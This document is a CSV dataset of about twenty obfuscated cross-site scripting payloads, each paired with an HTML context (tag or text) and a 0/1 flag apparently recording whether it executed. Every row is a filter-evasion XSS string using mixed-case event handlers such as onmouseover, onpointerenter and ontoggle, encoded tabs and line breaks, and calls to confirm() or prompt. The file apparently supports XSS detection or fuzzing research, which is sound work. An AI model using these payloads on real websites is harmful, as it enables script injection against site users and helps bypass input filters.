payload,context,exec,combined
<a%09OnPOintERenter%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnPOintERenter%09=%09(confirm)()>v3dm0s
<d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dONPOInteRENTer%0d=%0dconfirm()%0dx>v3dm0s
<hTmL%09onPOinTErENteR%0d=%0dconfirm()%0dx//,html_text,0,CONTEXT_html_text <hTmL%09onPOinTErENteR%0d=%0dconfirm()%0dx//
<htmL/+/oNPoInteRenTER%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <htmL/+/oNPoInteRenTER%0a=%0aconfirm()//
<d3v%0donPoiNTErENteR+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v%0donPoiNTErENteR+=+confirm()>v3dm0s
<hTMl%0donMOuSEoVEr%0d=%0d[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <hTMl%0donMOuSEoVEr%0d=%0d[8].find(confirm)//
"<A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s"
<hTmL/+/oNMOusEOVeR+=+confirm()>,html_tag,0,CONTEXT_html_tag <hTmL/+/oNMOusEOVeR+=+confirm()>
"<DeTAiLs%0aONTOGGLe%0d=%0da=prompt,a()>",html_tag,0,"CONTEXT_html_tag <DeTAiLs%0aONTOGGLe%0d=%0da=prompt,a()>"
<d3v%0donmoUSeovER+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <d3v%0donmoUSeovER+=+confirm()%0dx>v3dm0s
<a%0donpoiNtERentEr+=+(confirm)()>v3dm0s,html_text,0,CONTEXT_html_text <a%0donpoiNtERentEr+=+(confirm)()>v3dm0s
<d3v/+/ONmOUSeOVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/ONmOUSeOVeR%0a=%0a(prompt)``%0dx>v3dm0s
<D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0dONMOusEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<A%0dONmOuSeOVEr%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONmOuSeOVEr%09=%09[8].find(confirm)%0dx>v3dm0s
<hTml%0doNMOUseOvEr%09=%09(prompt)``>,html_text,0,CONTEXT_html_text <hTml%0doNMOUseOvEr%09=%09(prompt)``>
<dEtAiLS/+/ONpoINtEReNtER%09=%09(confirm)()>,html_text,0,CONTEXT_html_text <dEtAiLS/+/ONpoINtEReNtER%09=%09(confirm)()>
<htML%0doNmoUseOvER%0d=%0d(prompt)``>,html_tag,0,CONTEXT_html_tag <htML%0doNmoUseOvER%0d=%0d(prompt)``>
<d3V%0dONmOUSEoveR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dONmOUSEoveR%09=%09[8].find(confirm)%0dx>v3dm0s
"<D3V/+/oNMOUseoVEr%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3V/+/oNMOUseoVEr%0d=%0da=prompt,a()>v3dm0s"
<html%09onMOuSEOVER%0d=%0d(prompt)``//,html_tag,0,CONTEXT_html_tag <html%09onMOuSEOVER%0d=%0d(prompt)``//
